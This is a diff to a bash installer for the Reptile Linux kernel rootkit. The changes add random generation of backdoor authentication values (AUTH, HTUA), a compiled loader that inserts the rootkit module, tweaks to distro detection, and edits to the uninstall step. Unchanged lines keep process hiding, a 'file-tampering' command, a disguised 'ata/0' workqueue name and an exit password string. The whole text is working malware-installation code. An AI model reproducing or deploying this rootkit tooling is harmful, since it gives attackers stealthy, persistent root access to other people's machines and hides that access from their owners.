@@ -6,6 +6,9 @@
 DRIVER="PulseAudio"
 KERNEL_VERSION=$(uname -r)
 PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"
+if [ $? -ne 0 ]; then
+        PWD="$(cd "$(dirname $0)" && pwd)/"
+fi
 
 function banner {
 	echo -e "\n\e[00;31m############################################################################\e[00m"
@@ -93,16 +96,22 @@ function reptile_init {
         exit
 	}
 
-    for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
+    for f in $(find /etc -type f -maxdepth 1 \( ! -path /etc/os-release ! -path /etc/lsb-release -path /etc/\*release -o -path /etc/\*version \) 2> /dev/null)
     do 
     	SYSTEM=${f:5:${#f}-13}
     done
 
     if [ "$SYSTEM" == "" ]; then
+    	echo -e "Failed to detect Linux distro type\n"
     	exit
     fi
+}
 
-	#perl -MCPAN -e "install String::Unescape"# > /dev/null 2>&1
+function random_gen {
+	RETVAL=$(openssl rand -hex 4)
+	if [ $? -ne 0 ]; then
+		RETVAL=$(cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
+	fi
 }
 
 function config_gen {
@@ -170,7 +179,7 @@ EOF
 	fi
 
 	cat >> scripts/start <<EOF
-$CMD hide \`ps -ef | grep "ata/0" | grep -v grep | awk '{print \$2}'\`
+#$CMD hide \`ps -ef | grep "ata/0" | grep -v grep | awk '{print \$2}'\`
 $CMD file-tampering
 #</$TAG>
 EOF
@@ -179,6 +188,10 @@ EOF
 	START="/"$MODULE"/"$MODULE"_start"
 	TAGIN="#<$TAG>"
 	TAGOUT="#</$TAG>"
+	random_gen
+	AUTH=0x"$RETVAL"
+	random_gen
+	HTUA=0x"$RETVAL"
 
 	cat > config.script <<EOF
 #ifndef _CONFIG_H
@@ -194,6 +207,8 @@ EOF
 #define PATH        "PATH=/sbin:/bin:/usr/sbin:/usr/bin"
 #define WORKQUEUE	"ata/0"
 #define SRCPORT 	$SRCPORT
+#define AUTH		$AUTH
+#define HTUA		$HTUA
 
 #endif
 EOF
@@ -218,6 +233,8 @@ EOF
 #define OUT 		5
 #define EXIT_LEN 	16
 #define EXIT 		";7(Zu9YTsA7qQ#vw"
+#define AUTH		$AUTH
+#define HTUA		$HTUA
 
 #endif
 EOF
@@ -264,8 +281,12 @@ function reptile_install {
     #	echo -ne "#<$TAG>\n$MODULE\n#</$TAG>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     fi
 
-	depmod && insmod /$MODULE/$MODULE.ko > /dev/null 2>&1
+	gcc loader.c -o loader
+	depmod && \
+	#insmod /$MODULE/$MODULE.ko > /dev/null 2>&1 
+	./loader /$MODULE/$MODULE.ko && \
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+	rm -f loader
 
 	directory_remove
 	echo -e "\nInstalation has finished!\n"
@@ -294,6 +315,8 @@ function reptile_remove {
 		/$MODULE/$MODULE"_cmd" show > /dev/null 2>&1 || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	fi
 
+	rmmod reptile &
+
 	rm -rf /$MODULE && \
 	rm -rf $DRIVER_DIRECTORY && \
 	echo -e "\e[01;36mDONE!\e[00m\n" || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
@@ -301,7 +324,7 @@ function reptile_remove {
 	directory_remove
 	echo
 
-	read -p "To complete this uninstallation is needed to reboot (Y/N) [default: N]: "
+	read -p "Reboot? (Y/N) [default: N]: "
 	if [ "$REPLY" == "Y" ] || [ "$REPLY" == "y" ]; then
         echo -e "Rebooting... "
         reboot
@@ -310,6 +333,7 @@ function reptile_remove {
 	else
         echo -e "Invalid option. Not rebooting the system!"
 	fi
+	echo
 }
 
 function client_build {
